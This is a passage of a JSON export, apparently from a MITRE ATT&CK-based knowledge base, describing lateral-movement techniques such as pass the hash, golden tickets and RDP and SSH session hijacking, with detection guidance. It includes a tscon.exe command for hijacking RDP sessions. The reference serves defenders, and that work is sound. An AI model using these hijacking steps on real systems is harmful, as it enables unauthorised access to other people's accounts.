of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)<\/p>\n<p>Adversaries may leverage <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/001\">Spearphishing Attachment<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/002\">Spearphishing Link<\/a> as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1056\">Input Capture<\/a> on sites that mimic email login interfaces.<\/p>\n<p>There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing attacks.(Citation: Trend Micro When Phishing Starts from the Inside 2017)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":276,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":276,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":276,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":276,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":276,"platform_id":9,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":310,"name":"T1075 - Pass the Hash","sort_id":0,"external_id":"T1075","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. <\/p>\n<p>Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":310,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":311,"name":"T1097 - Pass the Ticket","sort_id":0,"external_id":"T1097","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.<\/p>\n<p>In this technique, valid Kerberos tickets for <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> are captured by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">Credential Dumping<\/a>. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)<\/p>\n<p>Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)<\/p>\n<p>Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":311,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":335,"name":"T1076 - Remote Desktop Protocol","sort_id":0,"external_id":"T1076","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a> similar to RDS.<\/p>\n<p>Adversaries may connect to a remote system over RDP\/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1015\">Accessibility Features<\/a> technique for Persistence. (Citation: Alperovitch Malware)<\/p>\n<p>Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]<\/code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1018\">Remote System Discovery<\/a> and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":335,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":337,"name":"T1021 - Remote Services","sort_id":0,"external_id":"T1021","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.<\/p>\n<p>In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":337,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":337,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":337,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":339,"name":"T1091 - Replication Through Removable Media","sort_id":0,"external_id":"T1091","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":339,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":347,"name":"T1184 - SSH Hijacking","sort_id":0,"external_id":"T1184","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.<\/p>\n<p>In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1184\">SSH Hijacking<\/a> differs from use of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a> because it injects into an existing SSH session rather than creating a new session using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":347,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":347,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":361,"name":"T1051 - Shared Webroot","sort_id":0,"external_id":"T1051","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.<\/p>\n<p>This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":361,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":391,"name":"T1080 - Taint Shared Content","sort_id":0,"external_id":"T1080","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.<\/p>\n<p>A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses <a href=\"https:\/\/attack.mitre.org\/techniques\/T1547\/009\">Shortcut Modification<\/a> of directory .LNK files that use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to look like the real directories, which are hidden through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1564\/001\">Hidden Files and Directories<\/a>. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)<\/p>\n<p>Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and\/or .VBS.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\n\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":391,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":411,"name":"T1077 - Windows Admin Shares","sort_id":0,"external_id":"T1077","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$<\/code>, <code>ADMIN$<\/code>, and <code>IPC$<\/code>. <\/p>\n<p>Adversaries may use this technique in conjunction with administrator-level <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB\/RPC are <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1035\">Service Execution<\/a>, and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1047\">Windows Management Instrumentation<\/a>. Adversaries can also use NTLM hashes to access administrator shares on systems with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1075\">Pass the Hash<\/a> and certain configuration and patch levels. (Citation: Microsoft Admin Shares)<\/p>\n<p>The <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> utility can be used to connect to Windows admin shares on remote systems using <code>net use<\/code> commands with valid credentials. (Citation: Technet Net Use)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":411,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":428,"name":"T1427 - Attack PC via USB Connection","sort_id":0,"external_id":"T1427","external_sub_id":null,"old_external_id":"MOB-T1030","old_external_sub_id":null,"tactic_id":25,"description":"<p>With escalated privileges, an adversary could program the mobile device to impersonate USB devices such as input devices (keyboard and mouse), storage devices, and\/or networking devices in order to attack a physically connected PC(Citation: Wang-ExploitingUSB)(Citation: ArsTechnica-PoisonTap) This technique has been demonstrated on Android. We are unaware of any demonstrations on iOS.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":428,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":449,"name":"T1428 - Exploit Enterprise Resources","sort_id":0,"external_id":"T1428","external_sub_id":null,"old_external_id":"MOB-T1031","old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may attempt to exploit enterprise servers, workstations, or other resources over the network. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":449,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":449,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":576,"name":"T1021.003 - Distributed Component Object Model","sort_id":0,"external_id":"T1021.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.<\/p>\n<p>The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)<\/p>\n<p>Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)<\/p>\n<p>Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https:\/\/attack.mitre.org\/techniques\/T1012) or [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in Distributed Computing Environment\/Remote Procedure Call (DCE\/RPC) traffic.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":576,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":644,"name":"T1570 - Lateral Tool Transfer","sort_id":0,"external_id":"T1570","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/002\">SMB\/Windows Admin Shares<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/001\">Remote Desktop Protocol<\/a>. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":644,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":644,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":644,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":715,"name":"T1563.002 - RDP Hijacking","sort_id":0,"external_id":"T1563.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)<\/p>\n<p>Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]<\/code>, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1018\">Remote System Discovery<\/a> and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe \/k` or `cmd.exe \/c` in its arguments to detect RDP session hijacking.\n\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":715,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":723,"name":"T1021.001 - Remote Desktop Protocol","sort_id":0,"external_id":"T1021.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.<\/p>\n<p>Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) <\/p>\n<p>Adversaries may connect to a remote system over RDP\/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/008\">Accessibility Features<\/a> technique for Persistence.(Citation: Alperovitch Malware)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":723,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":725,"name":"T1563 - Remote Service Session Hijacking","sort_id":0,"external_id":"T1563","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.<\/p>\n<p>Adversaries may commandeer these sessions to carry out actions on remote systems. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1563\">Remote Service Session Hijacking<\/a> differs from use of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a> because it hijacks an existing session rather than creating a new session using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a>.(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nMonitor for processes and command-line arguments associated with hijacking service sessions.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":725,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":725,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":725,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":734,"name":"T1021.002 - SMB\/Windows Admin 